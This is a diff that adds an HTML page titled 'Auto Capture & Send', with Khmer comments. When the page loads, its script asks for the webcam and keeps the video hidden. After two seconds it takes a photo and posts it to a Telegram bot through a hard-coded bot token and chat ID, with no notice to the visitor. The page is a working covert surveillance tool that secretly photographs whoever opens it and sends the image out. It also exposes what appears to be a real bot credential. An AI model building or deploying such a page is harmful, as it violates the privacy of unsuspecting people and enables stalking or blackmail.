@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Send</title>
+</head>
+<body>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8000073471:AAHlFwK3AlBNwVZTRJvT7N40CYE8z82_WnA";  // ប្តូរជា Bot Token របស់អ្នក
+        const TELEGRAM_CHAT_ID = "5586750442";  // ប្តូរជា Chat ID ឬ Group ID
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(captureAndSendPhoto, 2000); // ថតរូបបន្ទាប់ពី 2 វិនាទី
+                };
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        }
+
+        async function captureAndSendPhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to Blob (image file)
+            canvas.toBlob(async (blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "photo.png");
+
+                // Send image to Telegram
+                try {
+                    let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                    let result = await response.json();
+                    console.log("Sent to Telegram:", result);
+                } catch (error) {
+                    console.error("Error sending photo:", error);
+                }
+
+                // Stop camera after sending
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }, "image/png");
+        }
+
+        // Start the process when page loads
+        window.onload = startCamera;
+    </script>
+
+</body>
+</html>
